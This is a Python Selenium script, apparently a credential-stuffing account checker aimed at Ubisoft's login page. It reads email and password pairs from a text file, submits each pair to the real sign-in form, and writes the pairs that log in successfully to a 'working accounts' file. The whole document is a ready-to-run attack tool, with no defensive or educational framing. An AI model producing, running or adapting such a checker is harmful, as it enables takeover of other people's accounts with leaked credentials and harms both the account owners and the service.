from selenium import webdriver
import time
counter=0
def mail():
     kp=open("uplaylar.txt","r")
     for a in kp.readlines()[counter:counter+1]:
         pass
     return a
     
def passw(): 
     kp=open("uplaylar.txt","r")   
     for a in kp.readlines()[counter+1:counter+2]:
         pass
     return a
def login():
    fp=webdriver.FirefoxProfile('C:/Users/USER/AppData/Roaming/Mozilla/Firefox/Profiles/test')#your pc directory
    browser=webdriver.Firefox(firefox_profile=fp)
    # browser = webdriver.Firefox()
    browser.get("https://connect.ubi.com/?appId=19ba479c-b658-4b7e-8ffd-88f2c85b79e6&genomeId=f925bee3-bb86-4ef6-8293-e03e1d608a43&lang=en-US&nextUrl=https%3a%2f%2fsupport.ubi.com%2fen-US%2fSignIn%2fLoginSuccess")
    time.sleep(3)
    global counter
    n_mail=mail()
    n_passw=passw()
    counter+=2
    username = browser.find_element_by_name("AuthEmail")
    password = browser.find_element_by_name("AuthPassword")
    username.send_keys(n_mail)
    password.send_keys(n_passw)
    login=browser.find_element_by_xpath("//*[@id='LogInButton']")
    time.sleep(2)
    login.click()
    time.sleep(8)
    print("kontrol "+str(counter)+"\n"+"mail= "+n_mail+"\n"+n_passw)
    if (browser.current_url=="https://support.ubi.com/en-US/SignIn/LoginSuccess" or browser.current_url=="https://connect.ubi.com/Default/EmailValidation?appId=19ba479c-b658-4b7e-8ffd-88f2c85b79e6&genomeId=f925bee3-bb86-4ef6-8293-e03e1d608a43&lang=en-US&nextUrl=https%3A%2F%2Fsupport.ubi.com%2Fen-US%2FSignIn%2FLoginSuccess"):
        print("account running")
        hesap = open("new_hesap.txt","a")
        hesap.write("\n"+n_mail+"\n"+n_passw)
        hesap.close()
        browser.close()
        begin()
    else:
        print("account not working")
        browser.close()
        begin()
def begin():
    login()
begin()

        
    
    
    
    
    
    
    
    
